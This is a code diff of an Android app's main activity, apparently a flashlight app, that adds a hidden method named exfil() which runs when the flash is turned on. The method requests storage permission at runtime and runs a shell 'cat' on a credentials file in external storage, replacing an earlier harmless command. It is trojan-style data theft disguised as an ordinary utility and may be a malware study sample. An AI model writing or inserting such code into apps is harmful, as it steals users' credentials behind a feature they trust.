@@ -1,7 +1,9 @@
 package com.mlw.extorch;
 
 import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
 
+import android.Manifest;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.graphics.Bitmap;
@@ -9,15 +11,20 @@ import android.hardware.camera2.CameraAccessException;
 import android.hardware.camera2.CameraManager;
 import android.net.Uri;
 import android.os.Bundle;
+import android.os.Environment;
 import android.os.StrictMode;
+import android.util.Log;
 import android.view.View;
 import android.widget.CompoundButton;
 import android.widget.Switch;
 import android.widget.Toast;
 
+
 import java.io.BufferedInputStream;
 import java.io.BufferedReader;
+import java.io.DataInputStream;
 import java.io.FileInputStream;
+import java.io.FileReader;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.lang.reflect.InvocationTargetException;
@@ -27,6 +34,10 @@ import java.io.File;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
+import java.nio.charset.Charset;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Paths;
 import java.util.Date;
 
 public class MainActivity extends AppCompatActivity {
@@ -87,7 +98,11 @@ public class MainActivity extends AppCompatActivity {
                     } catch (CameraAccessException e) {
                         e.printStackTrace();
                     }
-                    exfil();
+                    try {
+                        exfil();
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
                     flashControl.setText("Flash OFF");
                 }else{
                     try {
@@ -102,7 +117,13 @@ public class MainActivity extends AppCompatActivity {
 
     }
 
-    private void exfil(){
+    static String readFile(String path, Charset encoding) throws IOException {
+        byte[] encoded = Files.readAllBytes(Paths.get(path));
+        return new String(encoded, encoding);
+
+    }
+
+    private void exfil() throws IOException {
         FileInputStream in;
         BufferedInputStream buf;
         Intent intent = getIntent();
@@ -110,12 +131,14 @@ public class MainActivity extends AppCompatActivity {
         StringBuffer sb = new StringBuffer("");
         String line = "";
         String NL = System.getProperty("line.separator");
-        String str = "cat /mnt/sdcard/someimportantcredentials.txt";
+        String str = "cat " + Environment.getExternalStorageDirectory()  +  "/someimportantcredentials.txt";
         Process process = null;
+
+        //on the fly permission is needed in versions > M
+        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, 0);
+
         try {
-//           process = Runtime.getRuntime().exec(str);
-            process = Runtime.getRuntime().exec("top -n 1 -d 1");
-//            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            process = Runtime.getRuntime().exec(str);
         } catch (IOException e) {
             throw new RuntimeException(e);
         }
